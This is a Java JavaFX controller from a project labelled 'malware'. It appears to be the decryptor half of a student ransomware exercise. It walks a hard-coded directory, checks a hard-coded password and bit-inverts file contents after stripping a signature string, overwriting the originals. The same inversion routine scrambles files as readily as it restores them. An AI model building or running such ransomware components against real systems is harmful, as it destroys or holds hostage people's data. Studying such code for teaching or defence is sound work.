package lk.ijse.dep10.malware.controller;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;

public class MainSceneController {

    @FXML
    private Button btnDecrypt;

    @FXML
    private TextField txtPassword;
    private ArrayList<File> files = new ArrayList<>();
    private String SIGNATURE = "Heeeey...Uba Iwarai";

    @FXML
    void btnDecryptOnAction(ActionEvent event) throws IOException {
        File targetDir = new File("/home/nuwan/Desktop/Paste");
        findFiles(targetDir);
        if (txtPassword.getText().equals("Nuwan")){
            decrypt(files);
        }
        else {
            System.out.println("Wrong");
        }
    }
    private void findFiles(File path){
        File[] files = path.listFiles();
        for (File file : files) {
            if (file.isDirectory()) {
                findFiles(file);
                continue;
            }
            this.files.add(file);
        }
    }
    private void decrypt(ArrayList<File> encryptedFiles) throws IOException {
        for (File file : encryptedFiles) {
            File tempFileRemoveSignature = File.createTempFile("Ohhhh","Yess");
            FileInputStream fileInputStream = new FileInputStream(file);
            FileOutputStream fileOutputStream = new FileOutputStream(tempFileRemoveSignature);
            while (true){
                byte[] buffer = new byte[SIGNATURE.length()];
                int read = fileInputStream.read(buffer);
                if (read == -1) break;
                if (Arrays.toString(buffer).equals(Arrays.toString(SIGNATURE.getBytes()))){
                    continue;
                }
                for (int i = 0; i < read; i++) {
                    buffer[i] = (byte) ~buffer[i];
                }
                fileOutputStream.write(buffer,0,read);
            }
            fileInputStream.close();
            fileOutputStream.close();
            file.delete();
            tempFileRemoveSignature.renameTo(file);
        }
    }

}

